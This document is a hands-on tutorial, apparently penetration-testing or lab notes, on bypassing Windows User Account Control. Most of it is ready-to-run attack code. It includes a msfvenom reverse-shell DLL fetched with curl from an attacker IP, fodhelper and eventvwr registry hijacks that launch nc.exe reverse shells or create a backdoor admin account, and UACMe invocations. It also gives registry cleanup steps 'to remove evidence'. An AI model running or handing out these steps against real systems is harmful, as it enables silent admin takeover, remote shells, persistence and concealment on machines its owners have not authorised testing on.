## User Account Control

UAC is a convenience feature, not a security boundary. Its purpose is to protect admins from accidental changes, but it is not designed to stop a determined attacker who already has local admin credentials. The key thing to understand is that even a user in the Administrators group runs under a restricted medium-integrity token by default, and UAC bypasses allow you to silently move to a high-integrity token without triggering the consent prompt. 

***

## Understanding UAC Tokens

```
Admin user logs in
    |
    v
Windows creates TWO tokens:
    - Medium integrity token  <- used for normal process launches
    - High integrity token    <- only used when explicitly elevated

Non-elevated cmd.exe = medium integrity = limited admin rights
Elevated  cmd.exe = high integrity = full admin rights

UAC bypass = get a process to run with high integrity token
             WITHOUT triggering the consent prompt
```

***

## Step 1: Check UAC Configuration

```cmd
:: Is UAC enabled at all?
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
:: 0x1 = UAC is enabled
:: 0x0 = UAC is disabled (no bypass needed, already have full rights)

:: What level is it set to?
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: 0x0 = No prompt (Elevate without prompting) - easiest to bypass
:: 0x1 = Prompt for credentials on secure desktop
:: 0x2 = Prompt for consent on secure desktop (non-Windows binaries)
:: 0x3 = Prompt for credentials
:: 0x4 = Prompt for consent
:: 0x5 = Prompt for consent for non-Windows binaries (DEFAULT)
:: Note: 0x5 has fewer bypass options than 0x0-0x4

:: Check the integrity level of current process
whoami /groups | findstr "Mandatory Label"
:: Mandatory Label\Medium Mandatory Level = not elevated
:: Mandatory Label\High Mandatory Level = elevated

:: Check Windows build (determines which bypasses are available)
[environment]::OSVersion.Version
:: Build 14393 = Windows 1607
:: Build 17134 = Windows 1803
:: Build 18362 = Windows 1903
:: Build 19041 = Windows 2004
```

***

## Method 1: DLL Hijacking via SystemPropertiesAdvanced.exe

Works on Windows 10 builds **before 1903 (build 18362)**. The 32-bit auto-elevating binary `SystemPropertiesAdvanced.exe` attempts to load `srrstr.dll` from the user-writable `WindowsApps` folder, which is in the PATH. 

```bash
# Step 1: Generate malicious DLL on attack machine
# 32-bit payload required because SystemPropertiesAdvanced.exe is a 32-bit binary
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll

# Start listener
nc -lnvp 8443

# Host the DLL
python3 -m http.server 8080
```

```powershell
# Step 2: Download DLL to the WindowsApps folder (user-writable, in PATH)
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Confirm the file landed
dir C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# Step 3 (Optional): Test the DLL loads correctly at medium integrity first
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
# This gives a medium-integrity shell back - confirms DLL works but no UAC bypass yet
```

```cmd
:: Step 4: Kill any test rundll32 processes from the dry run
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F

:: Step 5: Trigger the UAC bypass - run the 32-bit binary from SysWOW64
:: The binary auto-elevates and loads srrstr.dll at high integrity
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

:: Other affected SysWOW64 binaries (same technique):
:: C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
:: C:\Windows\SysWOW64\SystemPropertiesHardware.exe
:: C:\Windows\SysWOW64\SystemPropertiesProtection.exe
:: C:\Windows\SysWOW64\SystemPropertiesRemote.exe
```

The resulting shell comes back with `SeImpersonatePrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and the full set of admin privileges available (all Disabled but present and activatable). 

***

## Method 2: fodhelper.exe Registry Hijack

Works on Windows 10 and many Windows 11 builds with default UAC. `fodhelper.exe` is a trusted auto-elevating binary that reads from a user-writable registry key before executing. 

```powershell
# Step 1: Create the registry key structure
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force

# Step 2: Set your payload as the command to execute
# Option A: Spawn elevated cmd.exe (if GUI access available)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value "cmd.exe" -Force

# Option B: Reverse shell
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value "C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd" -Force

# Option C: Add backdoor admin
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value "cmd /c net user hacker Pass1! /add && net localgroup Administrators hacker /add" -Force

# Step 3: Trigger the bypass
Start-Process "C:\Windows\System32\fodhelper.exe"

# Step 4: Clean up registry to remove evidence
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

***

## Method 3: eventvwr.exe Registry Hijack

Similar to fodhelper, but uses the Event Viewer binary and a different registry key: 
```powershell
# Create registry hijack
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" `
    -Name "(default)" `
    -Value "C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd" -Force

# Trigger
Start-Process "C:\Windows\System32\eventvwr.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

***

## Method 4: UACMe Automated Bypass

The UACMe project catalogues 60+ bypass techniques. Useful when you know the target build and want the most reliable method for it: 

```cmd
:: Syntax: Akagi64.exe <method_number> <command_to_run>

:: Method 54 - SystemPropertiesAdvanced DLL hijack (Build 14393+)
Akagi64.exe 54 C:\Windows\System32\cmd.exe

:: Method 23 - fodhelper registry hijack (Build 10240+)
Akagi64.exe 23 C:\Windows\System32\cmd.exe

:: Method 33 - eventvwr registry hijack (Build 10240+)
Akagi64.exe 33 C:\Windows\System32\cmd.exe

:: Method 41 - sfc.exe DLL hijack (Build 15063+)
Akagi64.exe 41 C:\Windows\System32\cmd.exe

:: Method 61 - dccw.exe (Build 15063+)
Akagi64.exe 61 C:\Windows\System32\cmd.exe

:: For reverse shell instead of cmd.exe:
Akagi64.exe 54 "C:\Windows\Temp\nc.exe 10.10.14.3 8443 -e cmd"
```

***

## Finding Auto-Elevating Binaries Manually

If you want to identify auto-elevating binaries yourself without relying on known lists:

```powershell
# Method 1: Check binary manifests for autoElevate=true
$binaries = Get-ChildItem "C:\Windows\System32\","C:\Windows\SysWOW64\" -Filter "*.exe" -ErrorAction SilentlyContinue
foreach ($bin in $binaries) {
    $manifest = [xml](& "C:\Windows\System32\mt.exe" -inputresource:"$($bin.FullName)" -out:temp.xml 2>$null)
    if ($manifest -match "autoElevate.*true") {
        Write-Host "[+] Auto-elevating: $($bin.FullName)"
    }
}

# Method 2: sigcheck from Sysinternals (fastest)
sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr -i "autoelevate"
# <autoElevate>true</autoElevate> = bypass candidate

# Method 3: Use strings to grep manifests without tools
strings "C:\Windows\System32\fodhelper.exe" | findstr /i "autoelevate"
```

***

## UAC Bypass Selection by Build

```
Check: [environment]::OSVersion.Version (Build number)
          |
          v
Build < 14393?  -> Many options available, try fodhelper or eventvwr
Build 14393-18361 (1607 to 1809)?
    -> SystemPropertiesAdvanced DLL hijack (UACMe Method 54)
    -> fodhelper registry hijack
    -> eventvwr registry hijack
Build 18362+ (1903+)?
    -> SystemPropertiesAdvanced DLL hijack PATCHED
    -> fodhelper registry hijack (still works on many builds)
    -> eventvwr registry hijack (still works on many builds)
    -> Check UACMe for build-specific methods
    -> ConsentPromptBehaviorAdmin = 0x5 (Always notify)? Fewer options - try UACMe

All methods fail?
    -> Confirm UAC level: ConsentPromptBehaviorAdmin = 0x5 (hardest)
    -> Try GUI consent prompt if you have RDP and user knows their password
    -> Pivot to a different privilege escalation technique entirely
```

***

## Confirming the Bypass Worked

```cmd
:: A successful bypass shows the full administrator token
whoami /priv
:: Should now show: SeDebugPrivilege, SeTakeOwnershipPrivilege,
::                  SeImpersonatePrivilege, SeBackupPrivilege, etc.

:: Check integrity level explicitly
whoami /groups | findstr "Mandatory"
:: Mandatory Label\High Mandatory Level = bypass successful

:: From elevated shell, everything is available
net localgroup Administrators        <- modify group membership
reg add HKLM\...                     <- write to HKLM keys
sc config ... binPath= ...           <- modify system services
```
